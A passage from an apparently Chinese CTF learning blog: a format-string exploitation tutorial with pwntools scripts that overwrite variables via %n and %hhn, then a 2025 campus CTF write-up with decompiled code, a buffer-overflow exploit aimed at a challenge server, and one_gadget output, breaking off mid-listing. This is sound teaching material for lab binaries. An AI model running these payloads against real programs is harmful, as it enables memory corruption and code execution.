大。</p><blockquote><p>或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。</p></blockquote><p>那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">aa%</span><span class="language-bash">k<span class="hljs-variable">$nxx</span></span><br></code></pre></td></tr></table></figure><p>此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8，其实就可以覆盖了。</p><p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh<br></code></pre></td></tr></table></figure><p>故而我们可以构造如下的利用代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">def fora():<br>    sh = process(&#x27;./overwrite&#x27;)<br>    a_addr = 0x0804A024<br>    payload = &#x27;aa%8$naa&#x27; + p32(a_addr)<br>    sh.sendline(payload)<br>    print sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure><p>对应的结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 76508<br>[*] Process &#x27;./overwrite&#x27; stopped with exit code 0 (pid 76508)<br>0xffc1729c<br><span class="hljs-meta prompt_">aaaa$</span><span class="language-bash">\xa0\x0modified a <span class="hljs-keyword">for</span> a small number.</span><br></code></pre></td></tr></table></figure><p>其实，这里我们需要掌握的小技巧就是，我们没有必要把地址放在最前面，放在哪里都可以，只要我们可以找到其对应的偏移即可。</p><h5 id="覆盖小数字-1"><a href="#覆盖小数字-1" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>上面介绍了覆盖小数字，这里我们介绍如何覆盖大数字。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。</p><p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。<br>h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。<br></code></pre></td></tr></table></figure><p>所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。这里，我们以单字节为例。</p><p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r<br></code></pre></td></tr></table></figure><p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12<br></code></pre></td></tr></table></figure><p>首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#x27;%6$n&#x27;+pad2+&#x27;%7$n&#x27;+pad3+&#x27;%8$n&#x27;+pad4+&#x27;%9$n&#x27;<br></code></pre></td></tr></table></figure><p>我们可以依次进行计算。这里给出一个基本的构造，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python3">def fmt(prev, word, index):<br>    if prev &lt; word:<br>        result = word - prev<br>        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;<br>    elif prev == word:<br>        result = 0<br>    else:<br>        result = 256 + word - prev<br>        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;<br>    fmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot;<br>    return fmtstr<br><br><br>def fmt_str(offset, size, addr, target):<br>    payload = &quot;&quot;<br>    for i in range(4):<br>        if size == 4:<br>            payload += p32(addr + i)<br>        else:<br>            payload += p64(addr + i)<br>    prev = len(payload)<br>    for i in range(4):<br>        payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i)<br>        prev = (target &gt;&gt; i * 8) &amp; 0xff<br>    return payload<br>payload = fmt_str(6,4,0x0804A028,0x12345678)<br></code></pre></td></tr></table></figure><p>其中每个参数的含义基本如下</p><ul><li>offset 表示要覆盖的地址最初的偏移</li><li>size 表示机器字长</li><li>addr 表示将要覆盖的地址。</li><li>target 表示我们要覆盖为的目的变量值。</li></ul><p>相应的 exploit 如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python3">def forb():<br>    sh = process(&#x27;./overwrite&#x27;)<br>    payload = fmt_str(6, 4, 0x0804A028, 0x12345678)<br>    print payload<br>    sh.sendline(payload)<br>    print sh.recv()<br>    sh.interactive()<br></code></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 78547<br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn<br>[*] Process &#x27;./overwrite&#x27; stopped with exit code 0 (pid 78547)<br>0xfff6f9bc<br>(\xa0\x0)\xa0\x0*\xa0\x0+\xa0\x0                                                                                                       X                                                                                                                                                                                                                             �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             ~modified b for a big number!<br></code></pre></td></tr></table></figure><p>当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p><h2 id="非栈上的格式化字符串漏洞"><a href="#非栈上的格式化字符串漏洞" class="headerlink" title="非栈上的格式化字符串漏洞"></a>非栈上的格式化字符串漏洞</h2><p>特点：</p><p>在非栈上的内存区域（如 bss 段存储未初始化的全局变量和静态变量，堆用于动态内存分配），数据的存储和访问方式与栈不同。利用非栈上格式化字符串漏洞需要了解这些区域的内存布局和可访问性。攻击者可以通过构造特定的格式化字符串，利用格式化函数在处理这些字符串时对内存的操作，来实现对非栈上内存的读写，进而达到攻击目的。例如，通过构造含有特定偏移量的格式化字符串，可以定位到目标内存地址，并使用 %n 等格式化字符来修改内存中的数据。</p>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>blog_learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>科技文化节</title>
    <link href="/%E7%A7%91%E6%8A%80%E6%96%87%E5%8C%96%E8%8A%82/"/>
    <url>/%E7%A7%91%E6%8A%80%E6%96%87%E5%8C%96%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<h1 id="2025科技文化节"><a href="#2025科技文化节" class="headerlink" title="2025科技文化节"></a>2025科技文化节</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="minesweeper"><a href="#minesweeper" class="headerlink" title="minesweeper"></a>minesweeper</h3><h4 id="checksec："><a href="#checksec：" class="headerlink" title="checksec："></a>checksec：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/cmp_1$ checksec sweeper<br>[*] &#x27;/mnt/d/copy/cmp_1/sweeper&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro："><a href="#IDA-Pro：" class="headerlink" title="IDA_Pro："></a>IDA_Pro：</h4><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init();<br>  <span class="hljs-keyword">while</span> ( dword_5010 != <span class="hljs-number">1</span> &amp;&amp; dword_5010 != <span class="hljs-number">2</span> &amp;&amp; dword_5010 != <span class="hljs-number">3</span> &amp;&amp; dword_5010 != <span class="hljs-number">4</span> )<br>  &#123;<br>    menu();<br>    __isoc99_scanf(&amp;unk_3157, &amp;dword_5010);<br>    <span class="hljs-keyword">switch</span> ( dword_5010 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">puts</span>(asc_3278);<br>        <span class="hljs-built_in">puts</span>(asc_329A);<br>        myexit();<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">puts</span>(asc_32B8);<br>        <span class="hljs-built_in">puts</span>(asc_329A);<br>        myexit();<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        m = <span class="hljs-number">30</span>;<br>        n = <span class="hljs-number">16</span>;<br>        l = <span class="hljs-number">99</span>;<br>        game();<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">puts</span>(aE_0);<br>        myexit();<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        hint();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(asc_32F0);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>case1,case2  并没有什么用处</strong></p><p><strong>case3 从逻辑上看是进行游戏，case4 也没什么用处貌似case5 就是讲解示范例子</strong></p><p><strong>其他情况就是输入有误</strong></p><p>所以问题应该出现在case3：</p><h5 id="game："><a href="#game：" class="headerlink" title="game："></a>game：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">m = <span class="hljs-number">30</span>;<br>n = <span class="hljs-number">16</span>;<br>l = <span class="hljs-number">99</span>;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">game</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// [rsp+8h] [rbp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(aE);<br>  sl = l;<br>  game_init();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %d X %d , %d 棰楅浄\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)m, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)n, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)l);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    mapping();<span class="hljs-comment">//貌似是一个打印扫雷地图的过程</span><br>    v1 = <span class="hljs-number">100</span>;<br>    v0 = <span class="hljs-number">100</span>;<br>    myread(&amp;v1, &amp;v0);<br>    dword_5010 = <span class="hljs-number">0</span>;<br>    choice();<br>    <span class="hljs-keyword">switch</span> ( dword_5010 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        explore(&amp;v1, &amp;v0);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        mine(&amp;v1, &amp;v0);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        mark(&amp;v1, &amp;v0);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="myread"><a href="#myread" class="headerlink" title="myread:"></a>myread:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">myread</span><span class="hljs-params">(<span class="hljs-type">int</span> *a1, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *a2)</span><span class="hljs-comment">//a1 = 100 ,a2 = 100[ 为无符号数 ] ，n = 16 ，m = 30</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">while</span> ( *a1 &gt; n || *a1 &lt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(asc_3138);<br>    __isoc99_scanf(&amp;unk_3157, a1);<span class="hljs-comment">//接受一个值为为100</span><br>    <span class="hljs-keyword">if</span> ( *a1 &gt; n || *a1 &lt;= <span class="hljs-number">0</span> )<span class="hljs-comment">//如果大于16或小于0，则输出错误信息，代表输入的行信息</span><br>      <span class="hljs-built_in">puts</span>(asc_315A);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)*a2 &lt;= m )<span class="hljs-comment">//检测用户输入的数是否小于30，代表输入的列信息</span><br>    &#123;<br>      result = *a2;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)result &gt; <span class="hljs-number">0</span> )<span class="hljs-comment">//返回值最后就是列值</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(asc_3170);<span class="hljs-comment">//如果不满足则输出错误，并重新进行输入</span><br>    __isoc99_scanf(&amp;unk_3157, a2);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)*a2 &gt; m || (<span class="hljs-type">int</span>)*a2 &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">puts</span>(asc_315A);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="choice："><a href="#choice：" class="headerlink" title="choice："></a>choice：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">choice</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    result = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_5010;<br>    <span class="hljs-keyword">if</span> ( dword_5010 == <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    result = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_5010;<br>    <span class="hljs-keyword">if</span> ( dword_5010 == <span class="hljs-number">2</span> )<br>      <span class="hljs-keyword">break</span>;<br>    result = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_5010;<br>    <span class="hljs-keyword">if</span> ( dword_5010 == <span class="hljs-number">3</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">printf</span>(asc_31C8);<br>    dword_5010 = read_int();<br>    <span class="hljs-keyword">if</span> ( dword_5010 != <span class="hljs-number">1</span> &amp;&amp; dword_5010 != <span class="hljs-number">2</span> &amp;&amp; dword_5010 != <span class="hljs-number">3</span> )<br>      <span class="hljs-built_in">puts</span>(asc_315A);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>接受输入为选择序号，不在列表范围内即排除</strong></p><p><strong>随后退出函数后进行相关操作</strong></p><p><strong>最开始看我觉得这个read_int 中的 unsigned_int可能有点说法,而且看到了它是一个手写的函数我觉得比较不对劲</strong></p><h5 id="read-int"><a href="#read-int" class="headerlink" title="read_int"></a><strong>read_int</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">read_int</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> buf; <span class="hljs-comment">// [rsp+Ch] [rbp-4h] BYREF</span><br><br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x10u</span>LL);<br>  <span class="hljs-keyword">return</span> buf;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>通常的无符号整型是4个字节，所以这个部分根本没有溢出</strong></p><p>但是随后又发现这个很不对劲啊，rbp-0x04吗？</p><p>随后开始构造</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context (os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27; , log_level=&#x27;debug&#x27;)<br><br>#p = process(&#x27;./sweeper&#x27;)<br>p = remote(&#x27;210.30.97.133&#x27;,10139)<br><br>p.sendline(&#x27;3&#x27;)<br>p.sendline(&#x27;3&#x27;)<br>p.sendline(&#x27;3&#x27;)<br>payload1 = b&#x27;a&#x27;*12 + b&#x27;\x46&#x27;<br>p.send(payload1)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/cmp_2$ checksec fmt<br>[*] &#x27;/mnt/d/copy/cmp_2/fmt&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro"><a href="#IDA-Pro" class="headerlink" title="IDA_Pro:"></a>IDA_Pro:</h4><h5 id="main-1"><a href="#main-1" class="headerlink" title="main:"></a>main:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you have one chance .&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100u</span>LL);<br>  func1(&amp;buf);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:00000000004040A0 buf             db    ? ;  <br></code></pre></td></tr></table></figure><h5 id="func1"><a href="#func1" class="headerlink" title="func1:"></a>func1:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">func1</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> func2(a1);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="func2"><a href="#func2" class="headerlink" title="func2:"></a>func2:</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">func2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  result = flag;<br>  <span class="hljs-keyword">if</span> ( flag == <span class="hljs-number">1</span> )<br>  &#123;<br>    result = <span class="hljs-built_in">printf</span>(a1);<br>    flag = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>可以明显地看到，func2中存在明显的格式化字符串漏洞</strong></p><p><strong>然后这个还是我们可以输入的东西，然后我们就测试一下发现确实就是输出和我们一样的东西，所以漏洞存在，围绕其开始</strong></p><p><strong>现在就是想要尝试通过先实现控制程序流程重启，再泄露libc，再修改返回地址为one_gadget</strong></p><h4 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget:"></a>one_gadget:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/cmp_2$ one_gadget ./libc.so.6<br>0xebc81 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])<br>constraints:<br>  address rbp-0x78 is writable<br>  [r10] == NULL || r10 == NULL || r10 is a valid argv<br>  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp<br><br>0xebc85 execve(&quot;/bin/sh&quot;, r10, rdx)<br>constraints:<br>  address rbp-0x78 is writable<br>  [r10] == NULL || r10 == NULL || r10 is a valid argv<br>  [rdx] == NULL || rdx == NULL || 